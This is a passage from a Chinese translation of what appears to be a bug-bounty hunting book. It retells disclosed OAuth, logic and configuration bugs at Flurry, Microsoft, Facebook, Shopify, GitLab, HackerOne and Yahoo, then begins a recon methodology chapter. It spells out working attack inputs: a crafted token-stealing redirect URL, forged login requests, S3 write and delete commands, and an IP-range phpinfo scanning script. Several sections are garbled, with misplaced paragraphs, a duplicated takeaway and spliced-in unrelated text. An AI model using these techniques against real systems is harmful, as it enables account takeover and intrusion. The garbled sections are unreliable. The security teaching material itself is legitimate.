请求中的 `"password":"not-provided"` 部分引起了 Cable 的注意。他注销账户，重新访问了 https://login.flurry.com/ 并在没有 OAuth 的情况下登录。相反，他提供了了自己的邮箱地址和 `not-provided` 密码。这成功了，Cable 登录了他的账户。

如果任何用户使用他们的 Yahoo! 账户和 OAuth 流程注册 Flurry，Flurry 就会在其系统中将该账户注册为客户端。然后 Flurry 将使用默认密码 `not-provided` 保存用户账户。Cable 提交了该漏洞，Yahoo! 在收到报告后五小时内修复了它。

### 启示

在这种情况下，Flurry 在身份验证过程中包含了一个额外的自定义步骤，在用户通过身份验证后使用 POST 请求创建用户账户。自定义的 OAuth 实现步骤经常配置不当并导致漏洞，请务必彻底测试这些流程。在这个例子中，Flurry 可能在现有的用户注册流程之上构建了 OAuth 工作流，以匹配应用程序的其他部分。Flurry 在实现 Yahoo! OAuth 之前并不要求用户创建账户。为了适应没有账户的用户，Flurry 可能决定调用相同的注册 POST 请求来创建用户。但该请求需要密码参数，因此 Flurry 设置了一个不安全的默认密码。

## 窃取 MICROSOFT 登录令牌

难度：高

URL：https://login.microsoftonline.com

来源：https://whittingon.io/articles/obtaining-tokens-outlook-account/

报告日期：2016年1月24日

赏金：$13,000

尽管 Microsoft 没有实现标准的 OAuth 流程，但它使用了一个非常相似且适用于测试 OAuth 应用程序的过程。当你测试 OAuth 或类似的身份验证过程时，请务必彻底测试重定向参数是如何验证的。你可以做到此的方法是向应用程序传递不同的 URL 结构。这正是 Jack Whitton 在 2016 年 1 月测试 Microsoft 登录过程时所做的，他可以窃取身份验证令牌。

由于 Microsoft 拥有许多属性，它根据用户要验证的服务，通过向 login.live.com、login.microsoftonline.com 和 login.windows.net 的请求来验证用户。这些 URL 将为用户返回会话。例如，outlook.com 的流程如下：

1. 用户访问 https://outlook.office.com。
2. 用户被重定向到 https://login.microsoftonline.com/login.srf?wa=signin1.0&rpsnv=4&reply=https%3a%2foutlook.office.com%2faid=260563
3. 如果用户已登录，将向 wreply 参数发送一个 POST 请求，其中包含一个用户的令牌参数。

将 wreply 参数更改为任何其他域名都会返回处理错误。Whitton 还尝试通过在 URL 末尾添加 %252f 对字符进行双重编码，创建了 https%3a%2foutlook.office.com%252f。在此 URL 中，特殊字符被编码，使得冒号（:）变为 %3a，斜杠（/）变为 %2f。双重编码时，攻击者还会对初始编码中的百分号（%）进行编码。这样做会使双重编码的斜杠变为 %252f（特殊字符在“Twitter HTTP Response Splitting”中讨论过）。当 Whitton 将 wreply 参数更改为双重编码 URL 时，应用程序返回了一个错误，指示 https://outlook.office.com%2f 不是一个有效的 URL。

接下来，Whitton 在域名后添加了 @example.com，这并没有导致错误。相反，它返回了 https://outlook.office.com%2f@example.com/?wa=wslogin1。之所以这样做是因为 URL 的结构如下：

```
[[username:password]@host[:port]][/path?[query#fragment]
```

用户名和密码参数是访问网站的基本身份凭据。因此，通过添加 @example.com，重定向主机不再是 outlook.office.com。相反，重定向可以被设置为任何攻击者控制的主机。

根据 Whitton 的说法，该漏洞产生是微软处理解码和 URL 验证的方式。微软可能使用了一个两步过程。首先，微软会进行健全检查，并确保域名有效且符合 URL 结构方案。URL https://outlook.office.com%2f@example.com 是有效的，因为 outlook.office.com%2f 会识别为有效的用户名。

其次，微软会递归解码 URL，直到没有其他字符可以解码为止。在这种情况下，https%3a%2f%2foutlook.office.com%252f@example.com 将递归解码直到返回 https://outlook.office.com@example.com。这意味着 @example.com 被识别为 URL 路径的一部分，但主机不会被验证为 outlook.office.com，因为 @example.com 位于斜杠之后。

当 URL 的各个部分组合时，微软验证了 URL 结构，解码了 URL，并将其验证为白名单，但返回的仅被解码一次的 URL。这意味着任何访问 https://login.microsoftonline.com/login.srf=wsign1.0&rpsnv=4&wreply=https%3a%2f%2ffoutlook.office.com%252f@example.com&id=260563 的目标用户的访问令牌（access token）将被发送到 example.com。example.com 的恶意所有者可以使用收到的令牌登录相关的微软服务，并访问他人的账户。

### 启示

当你在 OAuth 流程中测试重定向参数时，将 @example.com 作为重定向 URI 的一部分，以观察应用程序如何处理它。当你注意到过程正在利用应用程序需要解码以验证白名单重定向 URL 的编码字符时，你应该特别这样做。此外，在测试期间，始终注意应用程序行为的任何细微差别。在这种情况下，Whitton 注意到，当他完全更改 wreply 参数而不是附加双编码正斜杠时，返回的错误是不同的。这让他发现了微软配置不当的验证逻辑。

## 窃取 FACEBOOK 官方访问令牌

难度：高

URL：https://www.facebook.com

来源：http://philippheharewood.com/swiping-facebook-official-access-tokens/

报告日期：2016年2月29日

已付赏金：未透露

当你寻找漏洞时，请务必考虑目标应用程序所依赖的遗留资产。在这个例子中，Philippe Harewood 的初衷只有一个目标：捕获目标用户的 Facebook 令牌并访问其私有信息。但他无法在 Facebook 的 OAuth 实现中发现任何错误。他并没有气馁，而是转换思路，开始寻找一个可以接管的 Facebook 应用程序，使用的想法类似于子域名接管。



该想法是基于这样一个认知：Facebook 的主要功能包括一些 Facebook 拥有的应用程序，这些程序依赖 OAuth，并被所有 Facebook 账户自动授权。这些预先授权应用的列表位于 `https://www.facebook.com/search/me/apps-used/`。

在查看列表时，Harewood 发现了一个已获得授权的应用程序，尽管 Facebook 不再拥有或使用该域名。这意味着 Harewood 可以将白名单域名注册为 `redirect_uri` 参数，以接收任何访问 OAuth 授权的目标用户的 Facebook 令牌。

```
https://facebook.com/v2.5/dialog/oauth?response_type=token&display=popup&client_id=APP_ID&redirect_uri=REDIRECT_URI
```

在 URL 中，漏洞应用的 ID 由 `APP_ID` 表示，它包含了对所有 OAuth 范围的访问权限。白名单域名由 `REDIRECT_URI` 表示（Harewood 没有公开该配置不当的应用）。由于应用程序已对每个 Facebook 用户授权，任何目标用户都不无需批准请求的范围。此外，OAuth 过程将完全在后台 HTTP 请求中进行。通过访问此应用程序的 Facebook OAuth URL，用户将被重定向到 URL `http://REDIRECT_URI/#token=access_token_appended_here/`。

由于 Harewood 注册了 `REDIRECT_URI` 的地址，他能够记录访问该 URL 的用户的访问令牌，这让他能够访问他们的整个 Facebook 账户。此外，所有官方 Facebook 访问令牌都包含对其他 Facebook 拥有属性（如 Instagram）的访问权限。因为 Harewood 可以代表目标用户访问所有 Facebook 属性。

## 启示

寻找漏洞时要考虑潜在的遗留资产。在这个例子中，遗留资产是一个具有全范围权限的敏感 Facebook 应用程序。但其他示例包括子域名 CNAME 记录和应用程序依赖，例如 Ruby Gems、JavaScript 库等。如果应用程序依赖外部资产，开发者未来可能会停止使用该资产并忘记将其从应用程序中断开。如果攻击者可以接管该资产，可能会对应用程序产生严重后果。尽管 OAuth 有标准，但它很容易被配置不当。

## 总结

与书中涵盖的之前的漏洞不同（它们依赖于提交恶意输入），应用程序逻辑和配置漏洞利用了开发者犯的错误。*应用程序逻辑*漏洞发生在开发者编写了攻击者可以利用的代码逻辑错误时。*配置*漏洞发生在开发者错误配置了工具、框架、第三方服务或其他程序或代码时。

两种漏洞都涉及利用开发者的决策。其影响通常是攻击者获得了某些资源的未经授权访问。但由于这些漏洞源于编码和配置决策，可能很难描述。理解这些最好的方法是通过一个例子。

2012年3月，Egor Homakov 向 Ruby 团队报告 Rails 项目的默认配置是不安全的。当时，当开发者安装新的 Rails 站点时，Rails 默认生成的代码会接受提交到控制器操作的所有参数，以创建或更新数据库记录。换句话说，默认安装允许任何人发送 HTTP 请求来更新任何用户对象的用户 ID、用户名、密码和创建日期参数，无论开发者是否意图让这些参数可更新。这种漏洞通常被称为批量赋值漏洞。

除非开发者将参数标记为安全，否则默认配置不会接受参数。

GitHub 示例结合了应用程序逻辑和配置漏洞。GitHub 开发者本应添加安全预防措施，但由于他们使用了默认配置，他们创建了一个漏洞。

应用程序逻辑和配置漏洞可能比本书之前涵盖的漏洞更难发现（其他任何一个漏洞都不容易发现）。这是因为这些漏洞依赖于对编码和配置决策的创造性思维。你对各种框架的内部运作越了解，就越容易发现这些类型的漏洞。例如，Homakov 知道该网站是使用 Rails 构建的，以及 Rails 默认是如何处理用户输入的。在其他示例中，我将展示漏洞报告者如何调用直接 API 请求，如何扫描成千万个 IP 地址以寻找配置不当的服务器，以及发现并非意供公开访问的功能。这些漏洞需要对 Web 框架的背景知识和调查技巧，我将侧重于那些帮助你建立这些知识的报告，而不是奖金高额的报告。

## 绕过 SHOPIFY 管理员权限

**难度**: 低

**URL**: `<shop>.myshopify.com/admin/mobile_devices.json`

**来源**: `https://hackerone.com/reports/100938/`

**报告日期**: 2015年11月22日

**奖金**: $500

与 GitHub 类似，Shopify 是使用 Ruby on Rails 框架构建的。Rails 之流行是因为当你用它开发网站时，框架会处理许多常见且重复的任务，例如解析参数、路由请求、提供文件等。但 Rails 默认不提供权限处理。相反，开发者必须编写自己的权限处理代码，或者安装具有相应功能的第三方 gem。*Gem* 是 Ruby 库。因此，在攻击 Rails 应用程序时，测试用户权限始终是一个好主意：你可能会发现应用程序逻辑漏洞，就像你寻找 IDOR 漏洞一样。

在这种情况下，报告者 rms 注意到 Shopify 定义了一个名为“Settings（设置）”的用户权限。该权限允许管理员在网站上下单时，通过 HTML 表单向应用程序中添加电话号码。没有此权限的用户在用户界面（UI）上没有被提供用于提交电话号码的字段。

通过使用 Burp 作为代理记录发送到 Shopify 的 HTTP 请求，rms 找到了 HTML 表单 HTTP 请求发送到的端点。接下来，rms 登录一个分配了 Settings 权限的账户，添加了一个电话号码，然后删除了该号码。Burp 的历史记录记录了添加电话号码的 HTTP 请求，该请求发送到了 `/admin/mobile_numbers.json` 端点。然后 rms 从用户账户中删除了 Settings 权限。此时，用户账户不应被允许添加电话号码。

使用 Burp Repeater 工具，rms 绕过了 HTML 表单，并在未获得 Settings 权限登录的情况下，向 `/admin/mobile_number.json` 发送了相同的 HTTP 请求。响应显示成功，在 Shopify 上创建一个测试订单确认了通知已发送到该电话号码。Settings 权限仅删除了用户可以输入电话号码的前端 UI 元素。但 Settings 权限并没有阻止没有权限的用户在网站后端提交电话号码。

## 核心启示

当你处理 Rails 应用程序时，务必测试所有用户权限，因为 Rails 默认不处理该功能。开发者必须实现用户权限，因此他们很容易忘记添加权限检查。此外，对你的流量进行代理始终是一个好主意。这样，你就可以轻松识别端点，并重放可能通过网站 UI 无法使用的 HTTP 请求。

## 绕过 TWITTER 账户保护

**难度**: 易

**URL**: `https://twitter.com`

**来源**: 无

**报告日期**: 2016年10月

**奖金**: $560

在测试时，确保你考虑应用程序网站与其移动版本之间的差异。两种体验之间可能存在应用程序逻辑差异。当开发者没有妥善考虑这些差异时，可能会创建漏洞，这就是本报告中发生的情况。

2016年秋，Aaron Ullger 注意到当他第一次从未知的 IP 地址和浏览器登录 Twitter 时，Twitter 网站在身份验证之前需要额外信息。请求的信息通常是与账户相关的电子邮件或电话号码。此安全功能旨在确保如果你的账户登录被破解，攻击者如果没有这些额外信息，就无法访问账户。

在测试期间，Ullger 使用手机连接到 VPN，这分配了一个新的 IP 地址。在浏览器上登录未识别 IP 地址时，他本会被提示提供额外信息，但在手机上他从未被提示过这样做。这意味着如果攻击者破解了他的账户，他们可以通过使用移动应用程序登录来规避额外的安全检查。此外，攻击者可以在应用内查看用户的电子邮件地址和电话号码，这将允许他们通过网站登录。

作为回应，Twitter 验证并修复了该问题，并给了 Ullger $560。

## 核心启示

当你使用不同方法访问应用程序时，考虑安全相关的行为在不同平台之间是否一致。在这种情况下，Ullger 只测试了应用程序的浏览器和移动版本。但其他网站可能使用第三方应用或 API 端点。

## HACKERONE 信号操纵

**难度**: 低

**URL**: `hackerone.com/reports/<X>`

**来源**: `https://hackerone.com/reports/106305`

**报告日期**: 2015年12月21日

**奖金**: $500

在测试时，确保你考虑应用程序网站与其移动版本之间的差异。两种体验之间可能存在应用程序逻辑差异。当开发者没有妥善考虑这些差异时，可能会创建漏洞，这就是本报告中发生的情况。

`https://community.rapid7.com/community/infosec/blog/2013/0-3/27/1951-open-s3-buckets/` 以及 `https://digi.ninja/projects/bucket_finder.php`。

Rapid7 的文章详细介绍了他们如何通过模糊测试（fuzzing）发现公开可读的 S3 桶（buckets）。为此，团队收集了一份有效的 S3 桶名称列表，并生成了一个包含常见排列组合的字典表，例如 backup、images、media 等。这两个列表为他们提供了数千种桶名称组合，用于他们使用 AWS 命令行工具测试访问权限。第二篇博客文章包含一个名为 `bucket_finder` 的脚本，它接受一个可能的桶名称的字典表列表，并检查列表中的每个桶是否存在。如果该桶确实存在，它将尝试使用 AWS 命令行工具读取内容。

我为 HackerOne 创建了一个潜在的桶名称列表，例如 `hackerone`、`hackerone.marketing`、`hackerone.attachments`、`hackerone.users`、`hackerone.files` 等。我将该列表交给 `bucket_finder` 工具并发现了几个桶，但没有一个是公开可读的。然而，我注意到脚本并没有测试它们是否是公开可写的。为了测试这一点，我使用 `aws s3 mv test.txt s3://hackerone.marketing` 命令创建并尝试将文本文件复制我发现的第一个桶。结果如下：

```
move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error
(AccessDenied) occurred when calling the PutObject operation: Access Denied
```

尝试下一个 `aws s3 mv test.txt s3://hackerone.files`，结果如下：

```
move: ./test.txt s3://hackerone.files/test.txt

Success!
```

接下来，我尝试使用 `aws s3 rm s3://hackerone.files/test.txt` 命令删除文件，并收到了另一个成功。

我能够从桶中写入和删除文件。理论上，攻击者可以将恶意文件移动到该桶中，这样 HackerOne 的员工可能会访问它。在我写报告时，我意识到无法确认 HackerOne 是否拥有该桶，因为 Amazon 允许用户注册任何桶名称。我不确定在没有所有权确认的情况下该怎么办，但我心想：管它呢。几小时后，HackerOne 确认了报告并修复了它，还发现了其他配置不当的桶。值得赞的是，HackerOne 在发放赏同时考虑了额外的桶并增加了我的报酬。

## 启示

HackerOne 是一个很棒的团队：黑客思维的开发者知道要防范常见的漏洞。但即使是最优秀的开发者也会出错。不要被吓倒而回避测试某个应用程序或功能。在测试时，重点关注容易配置错误的第三方工具。此外，如果你发现了关于新概念的写报告或公开访问的报告，尝试理解那些报告者是如何发现漏洞的。在这种情况下，这样做是为了研究人们是如何发现和利用 S3 配置错误的。

## 绕过 GitLab 双重身份认证

**难度**: 中等

**URL**: N/A

**来源**: `https://hackerone.com/reports/128085/`

**报告日期**: 2016年4月3日

**支付赏金**: N/A

双重身份认证（2FA）是一种安全功能，它在网站登录过程中添加了第二个步骤。传统上，用户登录网站时只需输入用户名和密码进行身份验证。有了 2FA，网站要求在密码之外进行额外的身份验证步骤。通常，网站会通过电子邮件、短信或身份验证器应用发送授权码，用户在提交用户名和密码后必须输入该代码。这些系统很难正确实现，是应用程序逻辑漏洞测试的良好候选对象。

2016年4月3日，Jober Abma 在 GitLab 中发现了一个漏洞。它允许攻击者在开启 2FA 的情况下，在不知道目标密码的情况下登录目标账户。Abma 注意到，一旦用户在登录过程中输入了用户名和密码，代码就会发送给该用户。将代码提交给网站将产生以下 POST 请求：

```
POST /users/sign_in HTTP/1.1
Host: 159.xxx.xxx.xxx
--snip--
----------881604860
Content-Disposition: form-data; name="user[attempt]"
212421
----------1881604860--
```

POST 请求将包含一个 OTP 令牌，用于验证用户 2FA 的第二步身份认证。OTP 令牌只有在用户已经输入用户名和密码后才会生成，但如果攻击者尝试登录自己的账户，他们可以使用 Burp 等工具拦截请求，并在请求中添加不同的用户名。这将更改他们正在登录的账户。例如，攻击者可以尝试登录名为 john 的用户账户：

```
POST /users/sign_in HTTP/1.1
Host: 159.xxx.xxx.xxx
--snip--
----------881604860
Content-Disposition: form-data; name="user[attempt]"
212421
----------1881604860
Content-Disposition: form-data; name="user[login]"
john
----------1881604860--
```

用户将包含 httponly cookies 的内容。由于 phpinfo 的内容被泄露，攻击者可以窃取 httponly cookie。这种利用是可能的，因为恶意 JavaScript 可以读取 HTTP 响应体的内容，尽管它不允许直接读取 cookie。

该漏洞的一个限制是攻击者必须猜测或知道有效的 OTP 令牌。OTP 令牌每 30 秒变化一次，且仅在用户登录时生成。尽管如此，GitLab 在报告后的两天内修复了该漏洞。

## 启示

双重身份认证是一个很难做好的系统。当你注意到网站在使用它时，务必测试其功能，例如令牌的有效期、最大尝试次数等。此外，检查过期的令牌是否可以重用，以及其他令牌漏洞。GitLab 是一个开源应用程序，Abma 通过审查代码发现了这个问题。

## 雅虎 PHP 信息泄露

**难度**: 中等

**URL**: `http://nc10.n923.mail.ne1.yahoo.com/phpinfo.php/`

**来源**: `https://blog.it-securityguard.com/bugbounty/yahoo-phpinfo-disclosure-2/`

**报告日期**: 2014年10月16日

**支付赏金**: N/A

该报告没有像本章其他报告那样获得赏金。但在 2014 年 10 月，HackerOne 的 Patrik Fehrenbach 发现了一个返回 phpinfo 内容服务器。phpinfo 输出 PHP 当前的状态。这些信息包括编译选项和扩展、版本号、服务器和环境信息、HTTP 头部等。由于每个系统的设置都不同，phpinfo 通常用于检查给定系统上的设置和预定义变量。这种详细信息不应在生产系统中公开，因为它为攻击者提供了有关目标基础设施的重要见解。

此外，尽管 Fehrenbach 没有提到这一点，但请注意 phpinfo 会包含 httponly cookies 的内容。如果一个域名存在 XSS 漏洞且存在显示 phpinfo 内容的 URL，攻击者可以使用 XSS 向该 URL 发送 HTTP 请求。由于 phpinfo 的内容被泄露，攻击者可以窃取 httponly cookie。这种利用是可能的，因为恶意 JavaScript 可以读取 HTTP 响应体的内容，尽管它不允许直接读取 cookie。

```
NetRange: 98.136.0.0 - 98.139.255.255
CIDR: 98.136.0.0/14
OriginAS:
NetName: A-YAHOO-US9
NetHandle: NET-98-136-0-0-1
Parent: NET-98-0-0-0-0
NetType: Direct Allocation
RegDate: 2007-12-07
Updated: 2012-03-02
Ref: http://whois.arin.net/net/rest/net/NET-98-136-0-0-1
```

第一行确认了 Yahoo! 拥有从 98.136.0.0 到 98.139.255.255（即 98.136.0.0/14）的大型 IP 地址块，这包含 260,000 个唯一的 IP 地址。这是一个非常大的潜在目标！Fehrenbach 使用以下简单的 bash 脚本搜索了 IP 地址的 phpinfo 文件：

```bash
#!/bin/bash
for ipa in 98.136{6..9}.{0..255}.{0..255}; do
  wget -t 1 -T 5 http://${ipa}/phpinfo.php; done &
```



代码 ① 处进入了一个 `for` 循环，遍历每对大括号中每个范围的所有可能数字。测试的第一个 IP 是 `98.136.0.0`，然后是 `98.136.0.1`，接着是 `98.136.0.2`，以此类推直到 `98.139.255.255`。每个 IP 地址将存储在变量 `ipa` 中。代码 ② 处使用 `wget` 命令行工具对正在测试的 IP 地址发送 GET 请求，并将 `$ipa` 替换为 `for` 循环中当前的 IP 地址值。`-t` 标志表示失败时重试 GET 请求的次数，在此情况下为 1。`-T` 标志表示在认为结果超时之前等待的秒数。运行他的脚本后，Ehrenbach 发现 URL `http://nc10.n9323.mail.ne1.yahoo.com` 启用了 `phpinfo` 函数。

## 启示

当你进行黑客攻击时，将公司的整个基础设施视为可以攻击的目标，除非被明确告知它不在范围内。虽然此报告没有获得奖金，但你可以采用类似的技术来寻找丰厚的报。此外，要寻找自动化测试的方法。你通常需要编写脚本或使用工具来自动化流程。例如，Ehrenbach 发现的 260,000 个潜在 IP 地址是不可能手动测试的。

## HACKERONE HACKTIVITY 投票

**难度:** 中等
**URL:** `https://hackerone.com/hacktivity/`
**来源:** `https://hackerone.com/reports/137503/`
**报告日期:** 2016年5月10日
**奖金:** 周边物品 (Swag)

尽管此报告在技术上没有发现安全漏洞，但它是如何利用 JavaScript 文件寻找新测试功能的绝佳示例。2016年春季，HackerOne 一直在开发一项功能允许黑客对报告进行投票。该功能在用户界面中并未启用，本不应该是可用的。

HackerOne 使用 `React` 框架渲染其网站，因此其许多功能定义在 JavaScript 中。使用 `React` 构建功能的一种常用方法是根据服务器的响应启用 UI 元素。例如，网站可能会根据服务器是否将用户识别为管理员来启用与管理员相关的功能（如删除按钮）。但服务器可能不会验证通过 UI 发起的 HTTP 请求是否是由合法管理员发出的。根据报告，黑客 apok 测试了被禁用的 UI 元素是否仍可用于发送 HTTP 请求。该黑客修改了 HackerOne 的 HTTP 响应，将任何 `false` 值更改为 `true`，可能使用了像 `Burp` 这样的代理。这样做显示了用于对报告投票的新 UI 按钮，点击时会触发 `POST` 请求。

发现隐藏 UI 特性的其他方法还包括使用浏览器开发者工具或像 `Burp` 这样的代理在 JavaScript 文件中搜索单词 "`POST`"，以识别网站使用的 HTTP 请求。搜索 URL 是一种无需浏览整个应用程序即可找到新功能的简单方法。在这种情况下，JavaScript 文件包含了以下内容：

```javascript
vote: function() {
  var a = this;
  ajax({
    url: this.url() + "/votes",
    method: "POST",
    datatype: "json",
    success: function(t) {
      return e.set({
        vote_id: t.vote_id,
        vote_count: t.vote_count
      })
    }
  })
},
unvote: function() {
  var e = this;
  a.ajax({
    url: this.url() + "/votes" + this.get("vote_id"),
    method: "DELETE",
    datatype: "json",
    success: function(t) {
      return e.set({
        vote_id: t.vote_id0,
        vote_count: t.vote_count
      })
    }
  })
}
```

## 启示

当你进行黑客攻击时，将公司的整个基础设施视为可以攻击的目标，除非被明确告知它不在范围内。虽然此报告没有获得奖金，但你可以采用类似的技术来寻找丰厚的报。此外，要寻找自动化测试的方法。你通常需要编写脚本或使用工具来自动化流程。例如，Ehrenbach 发现的 260,000 个潜在 IP 地址是不可能手动测试的。



像 `EyeWitness` 和 `Nmap` 这样的工具，可以为你自动执行枚举。

## 总结

发现应用程序逻辑和配置漏洞需要你留意以不同方式与应用程序交互的机会。Shopify 和 Twitter 的例子很好地说明了这一点。Shopify 在 HTTP 请求期间没有验证权限。同样，Twitter 在其移动端应用程序上忽略了安全检查。这两者都涉及到从不同的视角对网站进行测试。

定位逻辑和配置漏洞的另一个技巧是找到你可以探索的应用程序表面积。例如，新功能是发现这些漏洞的绝佳切入点。它通常为发现通用漏洞提供了良好机会。新代码为你提供了测试边界情况或新代码与现有功能之间交互的机会。你还可以深入研究网站的 JavaScript 源代码，以发现网站 UI 中不可见的功能更改。

黑客可能非常耗时，因此学习能够自动化你工作的工具非常重要。本章中的示例包括短小的 `bash` 脚本、`Nmap`、`EyeWitness` 和 `bucket_finder`。你将在附录 A 中找到更多工具。

# 19 寻找你自己的漏洞赏金

![](img/0e0c482eb94dba4b95528b396562dd10_356_0.png)

遗憾的是，黑客攻击没有神奇公式，而且不断演变的技术太多，我无法解释寻找漏洞的每一种方法。虽然本章不会让你成为一台精英黑客机器，但它应该教你成功的漏洞猎人所遵循的模式。本章将引导你通过一种基础方法开始黑入任何应用程序。它基于我采访成功黑客、阅读博客、观看视频以及实际进行黑客攻击的经验。

当你刚开始黑客时，最好根据你获得的知识和经验来定义成功，而不是你发现的漏洞或赚到的钱。这是因为如果你的目标是在知名项目中寻找漏洞，或者尽可能发现许多漏洞，或者仅仅是为了赚钱，如果你是黑客领域的新手，最初可能不会成功。非常聪明且有成就的黑客每天都会测试 `Uber`、`Shopify`、`Twitter` 和 `Google` 等成熟程序，因此可发现的漏洞要少得多，而且很容易感到沮丧。如果你专注于学习新技能、识别模式和测试新技术，你可以在枯燥期对你的黑客活动保持积极态度。

## 侦察

通过一些侦察（`recon`，简称 `recon`）开始接触任何漏洞赏金计划以获取更多应用程序的信息。正如你从之前的章节中所知，当你测试应用程序时有很多需要考虑的内容。从问这些及其他基础问题开始：

- 程序的范围是什么？是 `*.example.com` 还是只是 `www.example.com`?
- 公司有多少个子域名？
- 公司拥有多少 IP 地址？
- 它是什么类型的网站？软件即服务？开源？协作型？付费还是免费？
- 它使用了哪些技术？用什么编程语言编写的？使用什么数据库？

这些问题只是你开始黑客时需要考虑的因素之一。为了本章，让我们假设你正在测试一个具有开放范围的应用程序，例如 `*.example.com`。从可以在后台运行的工具开始，这样你在等待工具结果时可以进行其他侦察。你可以从电脑运行这些工具，但你面临被 `Akamai` 等公司封禁 IP 地址的风险。`Akamai` 是一种流行的 Web 应用防火墙，如果它封禁了你，你可能无法访问常用网站。

为了避免被封，我建议从允许在其系统进行安全测试的云托管提供商开启虚拟专用服务器（`VPS`）。务必研究你的云提供商，因为有些供应商不允许这种类型的测试（例如，在本文编写期间，`Amazon Web Services` 在没有明确许可的情况下不允许安全测试）。

### 子域名枚举

如果你在开放范围内进行测试，可以从使用 `VPS` 寻找子域名开始侦察。你发现的子域名越多，攻击面就越大。为了这一点，我推荐使用 `SubFinder` 工具，它速度快且用 `Go` 语言编写。`SubFinder` 会根据各种来源（包括证书注册、搜索引擎结果、`Internet Archive Wayback Machine` 等）抓取网站的子域名记录。

`SubFinder` 进行的默认枚举可能找不到所有的子域名。但与特定 SSL 证书关联的子域名很容易，因为有记录 SSL 证书的证书透明度日志。例如，如果网站为 `test.example.com` 注册了证书，那么该子域名很可能存在，至少在注册时是。但网站可能会为通配符子域名 (`*.example.com`) 注册证书。如果是这种情况，你可能只能通过暴力破解猜测找到一些子域名。

方便的是，`SubFinder` 还可以帮助你使用常用词表对子域名进行暴力破解。附录 A 中引用的 GitHub 安全列表仓库 `SecLists` 有常用子域名列表。此外，`Jason Haddix` 在 `https://github.com/jhadix/86a06c5dc309d08580a018c66354a056` 发布了一个非常有用的列表。

如果你不想使用 `SubFinder` 只想浏览 SSL 证书，`crt.sh` 是检查是否注册了通配符证书的极佳参考。如果你发现了通配符证书，可以在 `censys.io` 上搜索证书哈希值。通常，`crt.sh` 上每个证书都有指向 `censys.io` 的直接链接。

一旦你完成了 `*.example.com` 的子域名枚举，就可以对找到网站进行端口扫描和截图。在继续之前，还要考虑对子域名进行枚举是否有意义。例如，如果你发现某个网站为 `*.corp.example.com` 注册了 SSL 证书，你可能通过枚举该子域名发现更多子域名。

### 端口扫描

枚举子域名后，你可以开始端口扫描以识别更多的攻击面，包括运行的服务。例如，通过扫描 `Pornnhub`，`Andy Gill` 发现了一个暴露的 `Memcache` 服务器，并赚了 2500 美元，如第 18 章所述。

端口扫描的结果也可以反映公司的整体安全状况。例如，一个关闭除 80 和 443（托管 HTTP 和 HTTPS 网站的常用端口）之外的所有端口的公司可能有安全意识。但有很多开放端口的公司可能相反，可能有漏洞奖励。

两种常用的端口扫描工具是 `Nmap` 和 `Masscan`。`Nmap` 是一个较旧的工具，除非你知道如何优化它，否则运行很慢。但好处在于你可以给它一个 URL 列表，它会确定要扫描的 IP 地址。它还是模块化的，所以你可以在扫描中包含其他检查。例如，脚本 `http-enum` 用于文件和目录暴力破解。相比之下，`Masscan` 极快，当你有一组 IP 地址需要扫描时可能最合适。我使用 `Masscan` 搜索常用的开放端口，例如 80、443、8080 或 8443，然后将结果与截图（我在下一节中讨论的话题）结合起来。

### 截图

与端口扫描一样，一旦获取了子域名列表，采取的一个很好的步骤是对它们进行截图。这很有帮助，因为可以让你对程序的范围有一个直观的视觉概述。在查看截图时，有一些常见的模式可能预示着漏洞。首先，寻找与已知会导致子域名接管（`subdomain takeover`）相关的服务的常见错误消息。如第 14 章所述，依赖外部服务的应用程序可能会随着时间的推移而变化，其 DNS 记录可能被遗留且无人问津。如果攻击者可以接管该服务，可能会对应用程序及其用户产生重大影响。或者，截图可能没有显示错误消息，但仍可能显示该子域名正依赖某个第三方服务。

其次，你可以寻找敏感内容。例如，如果在 `*.corp.example.com` 上发现的所有子域名都返回 403 访问拒绝，只有其中一个子域名登录到一个不寻常的网站，请调查那个异常的网站，因为它可能实现了自定义行为。同样，还要留意管理员登录页面、默认安装页面等。

第三，寻找与其它子域名上的典型应用不匹配的应用程序。例如，如果只有一个 `PHP` 应用，而所有其他子域名都是 `Ruby on Rails`，那么关注这个 `PHP` 应用可能是值得的，因为该公司的专长似乎是 `Rails`。子域名上发现的应用程序的重要性在变得熟悉它们之前很难确定，但它们可能会带来巨额的赏金，就像 `Jasmin Landry` 在第 12 章描述中，他将 `SSH` 访问提升到远程代码执行时发现的那样。

有几个工具可以帮助你为网站截图。在写作期间，我使用 `HTTPSShot` 和 `Gowitness`。`HTTPSShot` 有两个优点：首先，你可以配合 IP 地址列表使用它，它会对它们进行截图，并根据 SSL 证书解析枚举其他子域名。其次，它会根据页面是 403 消息还是 500 消息、是否使用相同的内容管理系统以及其他因素将结果进行分类。该工具还包含了它发现的 HTTP 头部，这很有用。

`Gowitness` 是一个快速、轻量级的截图替代方案。当我有一组 URL 而不是 IP 地址列表时，我会使用这个工具。它也包含了截图时接收到的头部。

## 内容发现

一旦你审查了子域名和视觉侦察结果，就应该寻找有趣的内容。你可以通过几种不同的方法处理内容发现阶段。一种方法是尝试通过破解（`brute-forcing`）来发现文件和目录。这种技术的成功取决于你使用的词表列表；如之前提到的，`SecLists` 提供了很好的列表，特别是我使用的 `raft` 列表。你还可以随时间跟踪这一步的结果，以编译你自己的常用文件列表。

一旦你有了文件和目录名称列表，就有几个工具可以选择。我使用 `Gobuster` 或 `Burp Suite Pro`。`Gobuster` 是一个用 `Go` 编写的可自定义且快速的破解工具。当你给它一个域名和词表时，它会测试目录和文件是否存在，并确认服务器的响应。此外，由 `Tom Hudson` 开发并同样用 `Go` 编写的 `Meg` 工具允许你同时在许多主机上测试多个路径。当你发现许多子域名并想同时发现所有子域的内容时，这是非常理想的。

由于我使用 `Burp Suite Pro` 代理我的流量，我将使用其内置的内容发现工具或 `Burp Intruder`。内容发现工具是可以配置的，允许你使用自定义词表或内置列表、寻找文件扩展名变体、定义要破解多少层嵌套文件夹等。另一方面，使用 `Burp Intruder` 时，我会向测试的域名发送一个请求到 `Intruder`，并在根路径末尾设置负载。然后将我的列表作为负载并运行攻击。通常，我会根据应用程序的响应情况根据内容长度或响应状态对结果进行排序。如果通过这种方式发现了一个有趣的文件夹，我可能会再次对该文件夹运行 `Intruder` 以发现嵌套文件。

当你需要超出文件和目录破解范围时，`Google dorking`（如第 10 章中 `Brett Auerhaus` 发现的漏洞的描述）也可以提供一些有趣的内容发现。`Google dorking` 可以节省你的时间，特别是当你发现通常与漏洞相关的 URL 参数（如 `url`、`redirect_to`、`id` 等）时。`Exploit DB` 维护了一个针对特定用例 `Google dorks` 数据库：`https://www.exploit-db.com/google-hacking-database/`

